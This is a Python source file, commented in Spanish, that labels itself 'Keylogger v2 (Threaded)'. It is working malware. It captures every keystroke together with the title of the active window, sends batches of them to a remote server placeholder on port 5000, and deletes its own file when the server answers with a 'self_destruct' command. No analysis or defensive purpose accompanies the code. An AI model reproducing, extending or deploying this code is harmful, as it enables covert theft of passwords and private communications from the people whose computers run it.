try:
    import requests
except ImportError:
    # --- Implementación mínima de respaldo (sin cambios) ---
    import urllib.request as _urllib_request
    import urllib.error as _urllib_error
    import json as _json

    class RequestException(Exception):
        pass

    class _Response:
        def __init__(self, status_code, text):
            self.status_code = status_code
            self.text = text
            def json(self):
                return _json.loads(self.text)

    class _RequestsModule:
        exceptions = type('E', (), {'RequestException': RequestException})
        @staticmethod
        def post(url, json=None, timeout=None):
            data = None
            headers = {'Content-Type': 'application/json'}
            if json is not None:
                data = _json.dumps(json).encode('utf-8')
            req = _urllib_request.Request(url, data=data, headers=headers, method='POST')
            try:
                with _urllib_request.urlopen(req, timeout=timeout) as resp:
                    body = resp.read().decode('utf-8', errors='ignore')
                    return _Response(resp.getcode(), body)
            except _urllib_error.HTTPError as e:
                try: body = e.read().decode('utf-8', errors='ignore')
                except: body = ''
                return _Response(e.code, body)
            except Exception as e:
                raise RequestException(e)

    requests = _RequestsModule()

import json
from pynput import keyboard
import time
import threading
import sys
import os
import subprocess

# --- CONFIGURACIÓN ---
SERVER_URL = "http://<IP-DEL-SERVIDOR>:5000/log"

# --- ESTADO GLOBAL ---
current_window = "Inicio"
log_buffer = []
# EL CANDADO: Vital para evitar corrupción de datos cuando usamos hilos
buffer_lock = threading.Lock()
# Semaforo para evitar múltiples envíos simultáneos
is_sending = False

def get_active_window_title():
    """Obtiene el título de la ventana activa de forma segura."""
    try:
        import ctypes
        GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
        GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
        GetWindowText = ctypes.windll.user32.GetWindowTextW
        hwnd = GetForegroundWindow()
        length = GetWindowTextLength(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        GetWindowText(hwnd, buff, length + 1)
        return buff.value if buff.value else "Desconocido"
    except:
        return "Desconocido/Linux"

def self_destruct():
    print("[!] AUTODESTRUCCIÓN ACTIVADA")
    script_path = os.path.abspath(sys.argv[0])
    try:
        if os.name == 'nt': 
            cmd = f'cmd /c ping localhost -n 3 > nul & del "{script_path}"'
            subprocess.Popen(cmd, shell=True)
        else: 
            os.remove(script_path)
    except Exception: pass
    os._exit(0)

def _send_thread_worker(window_title, text_data):
    """
    Función que corre en un hilo separado para enviar los datos.
    Si falla, devuelve los datos al buffer principal.
    """
    global is_sending, log_buffer
    
    payload = {
        "window_title": window_title,
        "keystrokes": text_data
    }

    try:
        # Intentamos enviar (timeout un poco más largo)
        response = requests.post(SERVER_URL, json=payload, timeout=10)
        
        if 200 <= response.status_code < 300:
            # ÉXITO
            # Verificar si hay orden de autodestrucción
            try:
                if hasattr(response, 'json') and callable(response.json):
                    resp_data = response.json()
                else:
                    resp_data = json.loads(response.text)
                
                if resp_data.get("command") == "self_destruct":
                    self_destruct()
            except: pass
        else:
            raise requests.exceptions.RequestException(f"Status {response.status_code}")

    except requests.exceptions.RequestException:
        # FALLO EL ENVÍO: RECUPERAR DATOS
        # Si falló, volvemos a meter los caracteres al principio del buffer
        # para que se intenten enviar en la próxima vez.
        with buffer_lock:
            # Convertimos el string de vuelta a lista y lo ponemos al inicio
            log_buffer = list(text_data) + log_buffer
    
    finally:
        is_sending = False

def trigger_send():
    """Prepara los datos y lanza el hilo de envío."""
    global log_buffer, current_window, is_sending

    # Si ya estamos enviando, no iniciamos otro envío para no saturar
    if is_sending:
        return

    text_to_send = ""
    window_snapshot = ""

    # Usamos el candado para "robar" los datos del buffer de forma segura
    with buffer_lock:
        if not log_buffer:
            return
        
        text_to_send = "".join(log_buffer)
        window_snapshot = current_window
        log_buffer = [] # Limpiamos el buffer (optimista)
        is_sending = True

    # Lanzamos el envío en un hilo APARTE (Daemon=True para que no bloquee el cierre)
    t = threading.Thread(target=_send_thread_worker, args=(window_snapshot, text_to_send))
    t.daemon = True
    t.start()

def on_press(key):
    global current_window, log_buffer

    # 1. Verificar ventana
    new_window = get_active_window_title()
    if new_window != current_window:
        if log_buffer:
            trigger_send()
        current_window = new_window

    # 2. Procesar tecla
    key_char = ""
    try:
        key_char = key.char
    except AttributeError:
        if key == keyboard.Key.space: key_char = " "
        elif key == keyboard.Key.enter: key_char = "\n"
        elif key == keyboard.Key.backspace: key_char = " [BS] "
        elif key == keyboard.Key.tab: key_char = " [TAB] "
        else: pass # Ignoramos otras teclas raras para no ensuciar

    if key_char:
        with buffer_lock:
            log_buffer.append(key_char)

    # 3. Enviar si hay suficientes datos
    # Aumenté un poco el buffer a 50 para no hacer peticiones constantes
    if len(log_buffer) >= 50:
        trigger_send()

# --- LOOP DE SEGURIDAD ---
# A veces, si el usuario deja de escribir, quedan datos en el buffer sin enviar.
# Este hilo revisa cada 10 segundos si hay algo pendiente y lo manda.
def watchdog():
    while True:
        time.sleep(10)
        with buffer_lock:
            if log_buffer:
                # Liberamos el lock antes de llamar a trigger para evitar deadlock
                pass
            else:
                continue
        trigger_send()

# Iniciar Watchdog
t_wd = threading.Thread(target=watchdog)
t_wd.daemon = True
t_wd.start()

print(f"Keylogger v2 (Threaded) iniciado. Target: {SERVER_URL}")
current_window = get_active_window_title()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
